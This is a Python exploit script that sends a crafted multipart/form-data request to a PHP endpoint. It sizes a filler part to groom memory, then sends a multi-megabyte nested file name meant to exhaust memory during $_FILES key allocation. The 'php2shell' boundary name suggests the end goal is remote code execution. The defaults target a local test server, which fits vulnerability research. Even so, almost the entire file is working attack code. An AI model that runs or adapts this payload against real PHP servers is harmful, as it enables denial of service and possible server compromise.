#!/usr/bin/env python3
"""Multipart variant: free a 276-byte fill string, let the first empty-file
part initialize $_FILES, then make a long nested file name exhaust memory
during a $_FILES key allocation."""
import argparse
import http.client
import secrets
import time


def part(boundary: bytes, name: bytes, value: bytes, filename: bytes | None = None,
         content_type: bytes = b"application/octet-stream") -> bytes:
    out = b"--" + boundary + b"\r\nContent-Disposition: form-data; name=\"" + name + b"\""
    if filename is not None:
        out += b"; filename=\"" + filename + b"\"\r\nContent-Type: " + content_type
    out += b"\r\n\r\n" + value + b"\r\n"
    return out


def build(name_len: int, fill_len: int, fill_byte: int) -> tuple[bytes, bytes]:
    boundary = b"----php2shell" + secrets.token_hex(8).encode()
    fill = bytes([fill_byte]) * fill_len
    body = b""
    body += part(boundary, b"", fill)
    body += part(boundary, b"f", b"", filename=b"")
    body += part(boundary, b"L" * name_len + b"[x]", b"", filename=b"")
    body += b"--" + boundary + b"--\r\n"
    return body, boundary


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=18088)
    ap.add_argument("--path", default="/index.php")
    ap.add_argument("--name-len", type=int, default=4 * 1024 * 1024)
    ap.add_argument("--fill-len", type=int, default=276)
    ap.add_argument("--fill-byte", default="41")
    args = ap.parse_args()

    body, boundary = build(args.name_len, args.fill_len, int(args.fill_byte, 16))
    print(f"body={len(body)} name_len={args.name_len} boundary={boundary.decode()}")
    conn = http.client.HTTPConnection(args.host, args.port, timeout=90)
    started = time.time()
    try:
        conn.request("POST", args.path, body=body,
                     headers={"Content-Type": "multipart/form-data; boundary=" + boundary.decode(),
                              "Connection": "close"})
        resp = conn.getresponse()
        data = resp.read()
        print(f"status={resp.status} elapsed={time.time()-started:.2f}s body={data[:300]!r}")
    except Exception as exc:
        print(f"exception={type(exc).__name__}: {exc} elapsed={time.time()-started:.2f}s")
    finally:
        conn.close()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
